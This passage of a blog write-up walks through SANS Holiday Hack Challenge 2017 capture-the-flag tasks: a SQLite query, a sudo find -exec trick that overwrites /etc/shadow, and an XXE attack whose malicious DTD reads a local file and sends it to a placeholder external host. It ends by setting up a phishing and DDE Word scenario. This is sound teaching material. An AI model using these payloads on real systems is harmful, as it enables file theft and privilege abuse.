    <span class="n">rock_throwers</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>

    <span class="c1"># We first get hair-pullers</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">hair_pulling_url</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;infractions&#39;</span><span class="p">]:</span>
        <span class="n">hair_pullers</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span>

    <span class="c1"># Then we get rock throwers</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">rock_throwing_url</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;infractions&#39;</span><span class="p">]:</span>
        <span class="n">rock_throwers</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span>

    <span class="c1"># Finally, we get the intersection, to find children who have done both</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">hair_pullers</span><span class="o">.</span><span class="n">intersection</span><span class="p">(</span><span class="n">rock_throwers</span><span class="p">)))</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="gp">$</span> ./find_moles.py
<span class="go">Nina Fitzgerald</span>
<span class="go">Kirsty Evans</span>
<span class="go">Beverly Khalil</span>
<span class="go">Sheri Lewis</span>
</pre></div>
<p>We now have the name of four more probable Munchkin moles, which gives us a
total of six Munchkin moles.</p>
</div>
</div>
<div class="section" id="sixth-page-of-the-great-book">
<h2><a class="toc-backref" href="#id44">Sixth page of <em>The Great Book</em></a></h2>
<div class="section" id="north-pole-and-beyond-i-don-t-think-we-re-in-kansas-anymore">
<h3><a class="toc-backref" href="#id45">North Pole and Beyond: I don't think we're in Kansas anymore</a></h3>
<div class="section" id="id10">
<h4><a class="toc-backref" href="#id46">Cranberry Pi</a></h4>
<pre class="literal-block">
                       *
                      .~'
                     O'~..
                    ~'O'~..
                   ~'O'~..~'
                  O'~..~'O'~.
                 .~'O'~..~'O'~
                ..~'O'~..~'O'~.
               .~'O'~..~'O'~..~'
              O'~..~'O'~..~'O'~..
             ~'O'~..~'O'~..~'O'~..
            ~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~.
          .~'O'~..~'O'~..~'O'~..~'O'~
         ..~'O'~..~'O'~..~'O'~..~'O'~.
        .~'O'~..~'O'~..~'O'~..~'O'~..~'
       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
 .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.
</pre>
<p>After finding the least popular browser, we must now find the most popular song
in the database:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@e3f1a585649d:~$</span> ls -lh
<span class="go">total 21M</span>
<span class="go">-rw-r--r-- 1 root root  16M Nov 29 19:28 christmassongs.db</span>
<span class="go">-rwxr-xr-x 1 root root 5.0M Dec  7 15:10 runtoanswer</span>
</pre></div>
<p>A database in a single flat file indicates that it's most likely a SQLite
database:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@e3f1a585649d:~$</span> sqlite3 ./christmassongs.db
<span class="go">SQLite version 3.11.0 2016-02-15 17:29:24</span>
<span class="go">Enter &quot;.help&quot; for usage hints.</span>
<span class="go">sqlite&gt; .tables</span>
<span class="go">likes  songs</span>
</pre></div>
<p>We have two tables, one named <code>likes</code>, one named <code>songs</code>. Let's
see their structure:</p>
<div class="highlight"><pre><span></span><span class="go">sqlite&gt; .schema</span>
<span class="go">CREATE TABLE songs(</span>
<span class="hll"><span class="go">  id INTEGER PRIMARY KEY AUTOINCREMENT,</span>
</span><span class="hll"><span class="go">  title TEXT,</span>
</span><span class="go">  artist TEXT,</span>
<span class="go">  year TEXT,</span>
<span class="go">  notes TEXT</span>
<span class="go">);</span>
<span class="go">CREATE TABLE likes(</span>
<span class="go">  id INTEGER PRIMARY KEY AUTOINCREMENT,</span>
<span class="hll"><span class="go">  like INTEGER,</span>
</span><span class="go">  datetime INTEGER,</span>
<span class="hll"><span class="go">  songid INTEGER,</span>
</span><span class="go">  FOREIGN KEY(songid) REFERENCES songs(id)</span>
<span class="go">);</span>
</pre></div>
<p>The <code>songs</code> table is pretty straightforward. The <code>likes</code> table
holds the number of likes for every song, using the song's id. If the
column <code>like</code> is 1, then the song was liked.</p>
<p>We can query the database to get the number of likes for every song id.
The correct query was found after reading <a class="reference external" href="http://www.sqlitetutorial.net/sqlite-count-function/">this tutorial on the COUNT function</a>.
This query will get the song id, their number of likes, and will sort them from
least to most liked.</p>
<div class="highlight"><pre><span></span><span class="n">sqlite</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">songid</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">from</span> <span class="n">likes</span> <span class="k">WHERE</span> <span class="k">like</span><span class="o">=</span><span class="mi">1</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">songid</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">);</span>
<span class="p">[...]</span>
<span class="mi">33</span><span class="o">|</span><span class="mi">1698</span>
<span class="mi">199</span><span class="o">|</span><span class="mi">1702</span>
<span class="mi">98</span><span class="o">|</span><span class="mi">1706</span>
<span class="mi">90</span><span class="o">|</span><span class="mi">1715</span>
<span class="mi">134</span><span class="o">|</span><span class="mi">1719</span>
<span class="mi">265</span><span class="o">|</span><span class="mi">1720</span>
<span class="mi">245</span><span class="o">|</span><span class="mi">1756</span>
<span class="mi">392</span><span class="o">|</span><span class="mi">8996</span>
</pre></div>
<p>Alright, the song with the id 392 is the most liked song. Now, we could query
the <code>songs</code> manually... Or! We could use an <a class="reference external" href="http://www.sqlitetutorial.net/sqlite-inner-join/">inner junction</a>,
just for the fun:</p>
<div class="highlight"><pre><span></span><span class="n">sqlite</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">title</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">from</span> <span class="n">likes</span> <span class="k">INNER</span> <span class="k">JOIN</span> <span class="n">songs</span> <span class="k">on</span> <span class="n">songs</span><span class="p">.</span><span class="n">id</span><span class="o">=</span><span class="n">likes</span><span class="p">.</span><span class="n">songid</span> <span class="k">WHERE</span> <span class="k">like</span><span class="o">=</span><span class="mi">1</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">songid</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">);</span>
<span class="p">[...]</span>
<span class="hll"><span class="n">I</span> <span class="n">Farted</span> <span class="k">on</span> <span class="n">Santa</span><span class="s1">&#39;s Lap (Now Christmas Is Gonna Stink for Me)|1689</span>
</span><span class="s1">Why Couldn&#39;</span><span class="n">t</span> <span class="n">It</span> <span class="n">Be</span> <span class="n">Christmas</span> <span class="k">Every</span> <span class="k">Day</span><span class="o">?|</span><span class="mi">1691</span>
<span class="n">A</span> <span class="n">Baby</span> <span class="n">Changes</span> <span class="n">Everything</span><span class="o">|</span><span class="mi">1693</span>
<span class="n">I</span><span class="err">&#39;</span><span class="n">ll</span> <span class="n">Be</span> <span class="n">Home</span><span class="o">|</span><span class="mi">1695</span>
<span class="k">Old</span> <span class="n">Time</span> <span class="n">Christmas</span><span class="o">|</span><span class="mi">1696</span>
<span class="n">Cold</span> <span class="n">December</span> <span class="n">Night</span><span class="o">|</span><span class="mi">1697</span>
<span class="n">Blue</span> <span class="n">Holiday</span><span class="o">|</span><span class="mi">1698</span>
<span class="n">Home</span> <span class="k">for</span> <span class="n">Christmas</span><span class="o">|</span><span class="mi">1702</span>
<span class="n">Christmas</span> <span class="n">Memories</span><span class="o">|</span><span class="mi">1706</span>
<span class="n">Christmas</span> <span class="k">Is</span> <span class="n">Now</span> <span class="n">Drawing</span> <span class="n">Near</span> <span class="k">at</span> <span class="n">Hand</span><span class="o">|</span><span class="mi">1715</span>
<span class="n">Coventry</span> <span class="n">Carol</span><span class="o">|</span><span class="mi">1719</span>
<span class="n">The</span> <span class="n">Little</span> <span class="n">Boy</span> <span class="n">that</span> <span class="n">Santa</span> <span class="n">Claus</span> <span class="n">Forgot</span><span class="o">|</span><span class="mi">1720</span>
<span class="n">Joy</span> <span class="k">to</span> <span class="n">the</span> <span class="n">World</span><span class="o">|</span><span class="mi">1756</span>
<span class="hll"><span class="n">Stairway</span> <span class="k">to</span> <span class="n">Heaven</span><span class="o">|</span><span class="mi">8996</span>
</span></pre></div>
<p>The most-liked song this Christmas seems to be <a class="reference external" href="https://www.youtube.com/watch?v=cwFQpRTwaP0">Stairway to Heaven</a>.
Although <a class="reference external" href="https://www.youtube.com/watch?v=FlFjR2vUy3M">I Farted on Santa's Lap (Now Christmas Is Gonna Stink for Me)</a>
seems to be doing pretty well!</p>
<div class="highlight"><pre><span></span><span class="gp">elf@ef4955c61cfe:~$</span> ./runtoanswer
<span class="go">Starting up, please wait......</span>
<span class="go">Enter the name of the song with the most likes: Stairway to Heaven</span>
<span class="go">That is the #1 Christmas song, congratulations!</span>
</pre></div>
</div>
<div class="section" id="id11">
<h4><a class="toc-backref" href="#id47">Redirecting the snowball</a></h4>
<p>Having the found the most popular song for this Christmas, we're given a new
object: the Portal, which can create a duplicate of our snowball in a second
place.</p>
<img alt="i_dont_think_we_re_in_kansas_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/i_dont_think_we_re_in_kansas_terminal.png" />
<p>Here's the layout:</p>
<img alt="i_dont_think_we_re_in_kansas_anymore.gif" class="align-center" src="/images/sans-christmas-challenge-2017/i_dont_think_we_re_in_kansas_anymore.gif" />
</div>
</div>
<div class="section" id="north-pole-christmas-town-infrastructure-elf-as-a-service-platform">
<h3><a class="toc-backref" href="#id48">North Pole Christmas Town infrastructure: Elf as a Service platform</a></h3>
<p>The Elf as a Service platform is a web application where you can order new
elves. To do so, you only have to upload an XML files, containing the details
of th elves you wish to order:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/Home/DisplayXml</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">eaas.northpolechristmastown.com</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">1946</span>
<span class="na">Origin</span><span class="o">:</span> <span class="l">http://eaas.northpolechristmastown.com</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundaryflybX2ZBWLwspXMu</span>

------WebKitFormBoundaryflybX2ZBWLwspXMu
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;Elfdata.xml&quot;
Content-Type: text/xml

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Elf&gt;&lt;Elf&gt;&lt;ElfID&gt;1&lt;/ElfID&gt;&lt;ElfName&gt;Elf On a Shelf&lt;/ElfName&gt;&lt;Contact&gt;8675309&lt;/Contact&gt;&lt;DateOfPurchase&gt;11/29/2017 12:00:00 AM&lt;/DateOfPurchase&gt;&lt;Picture&gt;1.png&lt;/Picture&gt;&lt;Address&gt;On a Shelf, Obviously&lt;/Address&gt;&lt;/Elf&gt;&lt;Elf&gt;&lt;ElfID&gt;2&lt;/ElfID&gt;&lt;ElfName&gt;Buddy the Elf&lt;/ElfName&gt;&lt;Contact&gt;8675309&lt;/Contact&gt;&lt;DateOfPurchase&gt;11/29/2017 12:00:00 AM&lt;/DateOfPurchase&gt;&lt;Picture&gt;2.png&lt;/Picture&gt;&lt;Address&gt;New York City&lt;/Address&gt;&lt;/Elf&gt;&lt;Elf&gt;&lt;ElfID&gt;3&lt;/ElfID&gt;&lt;ElfName&gt;Legolas&lt;/ElfName&gt;&lt;Contact&gt;8675309&lt;/Contact&gt;&lt;DateOfPurchase&gt;11/29/2017 12:00:00 AM&lt;/DateOfPurchase&gt;&lt;Picture&gt;3.png&lt;/Picture&gt;&lt;Address&gt;Middle Earth&lt;/Address&gt;&lt;/Elf&gt;&lt;Elf&gt;&lt;ElfID&gt;4&lt;/ElfID&gt;&lt;ElfName&gt;Marcus Elf&lt;/ElfName&gt;&lt;Contact&gt;8675309&lt;/Contact&gt;&lt;DateOfPurchase&gt;11/29/2017 12:00:00 AM&lt;/DateOfPurchase&gt;&lt;Picture&gt;4.png&lt;/Picture&gt;&lt;Address&gt;Canada&lt;/Address&gt;&lt;/Elf&gt;&lt;Elf&gt;&lt;ElfID&gt;5&lt;/ElfID&gt;&lt;ElfName&gt;Alf&lt;/ElfName&gt;&lt;Contact&gt;8675309&lt;/Contact&gt;&lt;DateOfPurchase&gt;11/29/2017 12:00:00 AM&lt;/DateOfPurchase&gt;&lt;Picture&gt;5.png&lt;/Picture&gt;&lt;Address&gt;Melmac&lt;/Address&gt;&lt;/Elf&gt;&lt;Elf&gt;&lt;ElfID&gt;6&lt;/ElfID&gt;&lt;ElfName&gt;Dobby the House Elf&lt;/ElfName&gt;&lt;Contact&gt;8675309&lt;/Contact&gt;&lt;DateOfPurchase&gt;11/29/2017 12:00:00 AM&lt;/DateOfPurchase&gt;&lt;Picture&gt;6.png&lt;/Picture&gt;&lt;Address&gt;London&lt;/Address&gt;&lt;/Elf&gt;&lt;Elf&gt;&lt;ElfID&gt;7&lt;/ElfID&gt;&lt;ElfName&gt;Malekith&lt;/ElfName&gt;&lt;Contact&gt;8675309&lt;/Contact&gt;&lt;DateOfPurchase&gt;11/29/2017 12:00:00 AM&lt;/DateOfPurchase&gt;&lt;Picture&gt;7.png&lt;/Picture&gt;&lt;Address&gt;Asgard&lt;/Address&gt;&lt;/Elf&gt;&lt;Elf&gt;&lt;ElfID&gt;8&lt;/ElfID&gt;&lt;ElfName&gt;Keebler Elf&lt;/ElfName&gt;&lt;Contact&gt;8675309&lt;/Contact&gt;&lt;DateOfPurchase&gt;11/29/2017 12:00:00 AM&lt;/DateOfPurchase&gt;&lt;Picture&gt;8.png&lt;/Picture&gt;&lt;Address&gt;Tree&lt;/Address&gt;&lt;/Elf&gt;&lt;Elf&gt;&lt;ElfID&gt;9&lt;/ElfID&gt;&lt;ElfName&gt;Jangle Bells&lt;/ElfName&gt;&lt;Contact&gt;8675309&lt;/Contact&gt;&lt;DateOfPurchase&gt;11/29/2017 12:00:00 AM&lt;/DateOfPurchase&gt;&lt;Picture&gt;9.png&lt;/Picture&gt;&lt;Address&gt;North Pole&lt;/Address&gt;&lt;/Elf&gt;&lt;/Elf&gt;

------WebKitFormBoundaryflybX2ZBWLwspXMu--
</pre></div>
<img alt="eaas_application.png" class="align-center" src="/images/sans-christmas-challenge-2017/eaas_application.png" />
<p>Hmm, that's interesting. Uploading XML files can often lead to eXternal XML
Entities (XXE) attacks. If the XML parser on the server side does not filter
XML entities, we can make the server perform several actions, such as outputing
the content of a local file, etc. More details are given in this <a class="reference external" href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">SANS blog
post</a>.</p>
<p>Since we want to recover the content of <code>C:\greatbook.txt</code>, let's
implement the attack, as given in the above tutorial. First, we'll host a
malicious .dtd file on our public facing server:</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="cp">&lt;!ENTITY % stolendata SYSTEM &quot;file:///c:/greatbook.txt&quot;&gt;</span>
<span class="cp">&lt;!ENTITY % inception &quot;&lt;!ENTITY &amp;#x25; sendit SYSTEM &#39;http://X.X.X.X/greatbook?%stolendata;&#39;&gt;</span>&quot;&gt;
</pre></div>
<p>Then, we'll send our malicious XML file to the EaaS application:</p>
<div class="highlight"><pre><span></span>POST /Home/DisplayXml HTTP/1.1
Host: eaas.northpolechristmastown.com
Content-Length: 731
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryflybX2ZBWLwspXMu

------WebKitFormBoundaryflybX2ZBWLwspXMu
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;Elfdata.xml&quot;
Content-Type: text/xml

<span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE demo [</span>
<span class="hll"><span class="cp">     &lt;!ELEMENT demo ANY &gt;</span>
</span><span class="hll">     <span class="cp">&lt;!ENTITY % extentity SYSTEM &quot;http://X.X.X.X/evil.dtd&quot;&gt;</span>
</span><span class="hll">     %extentity;
</span><span class="hll">     %inception;
</span><span class="hll">     %sendit;
</span>      ]
&gt;
<span class="p">&lt;</span><span class="nt">Elf</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">Elf</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">ElfID</span><span class="p">&gt;</span>1<span class="p">&lt;/</span><span class="nt">ElfID</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">ElfName</span><span class="p">&gt;</span>Elf On a Shelf<span class="p">&lt;/</span><span class="nt">ElfName</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">Contact</span><span class="p">&gt;</span>8675309<span class="p">&lt;/</span><span class="nt">Contact</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">DateOfPurchase</span><span class="p">&gt;</span>11/29/2017 12:00:00 AM<span class="p">&lt;/</span><span class="nt">DateOfPurchase</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">Picture</span><span class="p">&gt;</span>1.png<span class="p">&lt;/</span><span class="nt">Picture</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">Address</span><span class="p">&gt;</span>On a shelf, obviously<span class="p">&lt;/</span><span class="nt">Address</span><span class="p">&gt;</span>
   <span class="p">&lt;/</span><span class="nt">Elf</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">Elf</span><span class="p">&gt;</span>

------WebKitFormBoundaryflybX2ZBWLwspXMu--
</pre></div>
<p>We now trigger the XML parser by visiting the <code>/Home/DisplayXml</code> page,
which will trigger the downloading of our evil .dtd file:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> tail -f access.log <span class="p">|</span> grep -E <span class="s1">&#39;greatbook|evil.dtd&#39;</span>
<span class="go">35.185.118.225 - - [29/Dec/2017:00:22:54 +0100] &quot;GET /evil.dtd HTTP/1.1&quot; 200 200 &quot;-&quot; &quot;-&quot;</span>
<span class="go">35.185.118.225 - - [29/Dec/2017:00:22:54 +0100] &quot;GET /greatbook?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1&quot; 404 169 &quot;-&quot; &quot;-&quot;</span>
</pre></div>
<p>Our payload work! We now have the content of <code>C:\greatbook.txt</code>, which
is the URL <a class="reference external" href="http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf">http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf</a>.
We can now download the <a class="reference external" href="/docs/sans-christmas-challenge-2017/greatbook6.pdf">sixth page of The Great Book</a>
(sha256: <code>92dff9b155da22001dc72340791bde703fbf83bc0369e95aa9baea4ed5c36a84</code>):</p>
<blockquote>
<p>The Dreaded Inter-Dimensional Tornadoes</p>
<p>Throughout our recorded history, Oz has benefitted from quite favorable
weather, with frequent sunny days and a moderatly warm climate. Indeed, all
Munchkins enjoy essentially year-round springtime weather, keepking flowers
in bloom and making spirits bright.</p>
<p>However, one type of weather phenomenon interrupts the otherwise beautiful
climate of Oz - the dreaded Inter-Dimensional Tornadoes - when the weather
outside is frightful. While quite rare, these ferocious storms appear
suddenly and without a warning, striking Oz every year or two. These
calamitous cyclones vary in intensity, but even the weakest have caused
significant damage, lifting houses off their foundations and shredding
everything in their deadly path, especially paper products.</p>
<p>Inter-Dimensional Tornadoes get their unusual name because their intense
power has been known to rip holes into the very fabric of space and time,
allowing a single tornado to strike multiple different places in disparate
time eras simultaneously, interlinking each time and location touched by
the storm into a swirling inter-dimensional space-time vortex. Although the
specific physics of such storms remains elusive to our best scientists, one
thing is consistently observed by researchers and historians: When an
Inter-Dimensional Tornado strikes, it not only scatters whatever it has
vacuumed up throughout many lands, it sometimes also drops artifacts from
the past or even the future in its wake. Such storms have brought antique
watches, clothing, and curious gadgetry, lifting them from distant times
and far away places and depositing them in Oz.</p>
</blockquote>
</div>
</div>
<div class="section" id="seventh-page-of-the-great-book">
<h2><a class="toc-backref" href="#id49">Seventh page of <em>The Great Book</em></a></h2>
<div class="section" id="north-pole-and-beyond-oh-wait-maybe-we-are">
<h3><a class="toc-backref" href="#id50">North Pole and Beyond: Oh wait! Maybe we are...</a></h3>
<div class="section" id="id12">
<h4><a class="toc-backref" href="#id51">Cranberry Pi</a></h4>
<pre class="literal-block">
              \ /
            --&gt;*&lt;--
              /o\
             /_\_\
            /_/_0_\
           /_o_\_\_\
          /_/_/_/_/o\
         /&#64;\_\_\&#64;\_\_\
        /_/_/O/_/_/_/_\
       /_\_\_\_\_\o\_\_\
      /_/0/_/_/_0_/_/&#64;/_\
     /_\_\_\_\_\_\_\_\_\_\
    /_/o/_/_/&#64;/_/_/o/_/0/_\
   jgs       [___]
My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.
Restore /etc/shadow with the contents of /etc/shadow.bak, then run &quot;inspect_da_box&quot; to complete this challenge.
Hint: What commands can you run with sudo?
</pre>
<p>We need to restore the content of <code>/etc/shadow.bak</code> to <code>/etc/shadow</code>.</p>
<p>The hint is a pretty big one. If you remember <a class="reference external" href="/posts/2017/01/05/sans-christmas-challenge-2016/#sans-christmas-challenge-2016">last year's Christmas Challenge</a>,
you remember that we can use <code>sudo -l</code> to see what kind of command we
can execute:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@760499dcc4c9:~$</span> sudo -l
<span class="go">Matching Defaults entries for elf on 760499dcc4c9:</span>
<span class="go">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
<span class="go">User elf may run the following commands on 760499dcc4c9:</span>
<span class="go">    (elf : shadow) NOPASSWD: /usr/bin/find</span>
</pre></div>
<p>We can execute <code>find</code> as <code>elf:shadow</code> (that is, as the user
<code>elf</code>, member of the group <code>shadow</code>, I didn't know this syntax).
Let's take a look at the permissions to our <code>shadow</code> files:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@760499dcc4c9:~$</span> ls -lh /etc/shadow*
<span class="go">-rw-rw---- 1 root shadow 677 Dec 23 23:59 /etc/shadow</span>
<span class="go">-rw------- 1 root root   652 Nov 14 13:48 /etc/shadow-</span>
<span class="go">-rw-r--r-- 1 root root   677 Dec 15 19:59 /etc/shadow.bak</span>
</pre></div>
<p>We can see that the <code>shadow</code> group has write access to <code>/etc/shadow</code>.
So, we need a way, by running <code>find</code>, to copy the content from
<code>/etc/shadow.bak</code> to <code>/etc/shadow</code>. Luckily, <code>find</code> has the
<code>-exec</code> parameter, which can be used to execute command on the found
files:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@760499dcc4c9:~$</span> sudo -g shadow /usr/bin/find /etc -name shadow.bak -exec cp <span class="o">{}</span> /etc/shadow <span class="se">\;</span> <span class="m">2</span>&gt; /dev/null
<span class="gp">elf@760499dcc4c9:~$</span> inspect_da_box
<span class="go">                     ___</span>
<span class="go">                    / __&#39;.     .-&quot;&quot;&quot;-.</span>
<span class="go">              .-&quot;&quot;-| |  &#39;.&#39;.  / .---. \</span>
<span class="go">             / .--. \ \___\ \/ /____| |</span>
<span class="go">            / /    \ `-.-;-(`_)_____.-&#39;._</span>
<span class="go">           ; ;      `.-&quot; &quot;-:_,(o:==..`-. &#39;.         .-&quot;-,</span>
<span class="go">           | |      /       \ /      `\ `. \       / .-. \</span>
<span class="go">           \ \     |         Y    __...\  \ \     / /   \/</span>
<span class="go">     /\     | |    | .--&quot;&quot;--.| .-&#39;      \  &#39;.`---&#39; /</span>
<span class="go">     \ \   / /     |`        \&#39;   _...--.;   &#39;---&#39;`</span>
<span class="go">      \ &#39;-&#39; / jgs  /_..---.._ \ .&#39;\\_     `.</span>
<span class="go">       `--&#39;`      .&#39;    (_)  `&#39;/   (_)     /</span>
<span class="go">                  `._       _.&#39;|         .&#39;</span>
<span class="go">                     ```````    &#39;-...--&#39;`</span>
<span class="go">/etc/shadow has been successfully restored!</span>
</pre></div>
</div>
<div class="section" id="id13">
<h4><a class="toc-backref" href="#id52">Redirecting the snowball</a></h4>
<p>No new object for this one!</p>
<img alt="oh_wait_maybe_we_are_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/oh_wait_maybe_we_are_terminal.png" />
<p>Here's the layout:</p>
<img alt="oh_wait_maybe_we_are_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/oh_wait_maybe_we_are_snowball.gif" />
</div>
</div>
<div class="section" id="north-pole-christmas-town-infrastructure-elf-machine-interface-server">
<h3><a class="toc-backref" href="#id53">North Pole Christmas Town infrastructure: Elf-Machine Interface server</a></h3>
<p>The seventh question specifies that people use the Elf-Machine Interface server
to access email, and that we could get access to it via a phishing attack.</p>
<p>Let's take a look at Alabaster's emails. First, the phishing scenario:</p>
<blockquote>
<p><strong>From:</strong> <a class="reference external" href="mailto:alabaster.snowball&#64;northpolechristmastown.com">alabaster.snowball&#64;northpolechristmastown.com</a></p>
<p><strong>To:</strong> &quot;<a class="reference external" href="mailto:jessica.claus&#64;northpolechristmastown.com">jessica.claus&#64;northpolechristmastown.com</a>&quot;</p>
<p><strong>Subject:</strong> gingerbread cookie recipe</p>
<p>Hey Mrs Claus,</p>
<p>Do you have that awesome gingerbread cookie recipe you made for me last
year? You sent it in a MS word .docx file. <em>I would totally open that
docx on my computer if you had that. I would click on anything with the
words gingerbread cookie recipe in it</em>. I'm totally addicted and want to
make some more.</p>
<p>Thanks,</p>
<p>Alabaster Snowball</p>
<p><strong>From:</strong> <a class="reference external" href="mailto:alabaster.snowball&#64;northpolechristmastown.com">alabaster.snowball&#64;northpolechristmastown.com</a></p>
<p><strong>To:</strong> <a class="reference external" href="mailto:all&#64;northpolechristmastown.com">all&#64;northpolechristmastown.com</a></p>
<p><strong>Subject:</strong> Re: COOKIES!</p>
<p>Awesome, yea if anyone finds that .docx file containing the recipe for
&quot;gingerbread cookie recipe&quot;, please send it to me in a docx file. Im
currently working on my computer and would <em>totally download that to my
machine, open it, and click to all the prompts</em>.</p>
<p>Thanks!</p>
<p>Alabaster Snowball.</p>
</blockquote>
<p>Oh, Alabaster, your gluttony will be your downfall. Now let's see how to
deliver our payload:</p>
<blockquote>
<p><strong>From:</strong> <a class="reference external" href="mailto:minty.candycane&#64;northpolechristmastown.com">minty.candycane&#64;northpolechristmastown.com</a></p>
<p><strong>To:</strong> <a class="reference external" href="mailto:all&#64;northpolechristmastown.com">all&#64;northpolechristmastown.com</a></p>
<p><strong>Subject:</strong> Should we be worried?</p>
<p>Hey Alabaster,</p>
<p>You know I'm a novice security enthusiast, well I saw an article a while
ago about regarding DDE exploits that dont need macros for MS word to
get command execution.</p>
<p><a class="reference external" href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/">https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/</a></p>
<p>Should we be worried about this?</p>
<p>I tried it on my local machine and was able to transfer a file. Here's a
poc:</p>
<p><a class="reference external" href="http://mail.northpolechristmastown.com/attachments/dde_exmaple_minty_candycane.png">http://mail.northpolechristmastown.com/attachments/dde_exmaple_minty_candycane.png</a></p>
<p>I know your the resident computer engineer here so I wanted to defer to
the expert.</p>
<p>:)</p>
<p>-Minty CandyCane.</p>
<p><strong>From:</strong> <a class="reference external" href="mailto:alabaster.snowball&#64;northpolechristmastown.com">alabaster.snowball&#64;northpolechristmastown.com</a></p>
<p><strong>To:</strong> <a class="reference external" href="mailto:all&#64;northpolechristmastown.com">all&#64;northpolechristmastown.com</a></p>
<p><strong>Subject:</strong> Re: Should we be worried?</p>
<p>Quit worrying Minty,</p>
<p>You have nothing to worry about with me around! I have developed most of
the applications in our network including our network defenses. We are
are completely secure and impenetrable.</p>
<p>Sincerely,</p>
<p>Alabaster Snowball.</p>
</blockquote>
<p>Oh, Alabaster, your hubris will <strong>also</strong> be your downfall. And finally, what
payload can we use:</p>
<blockquote>
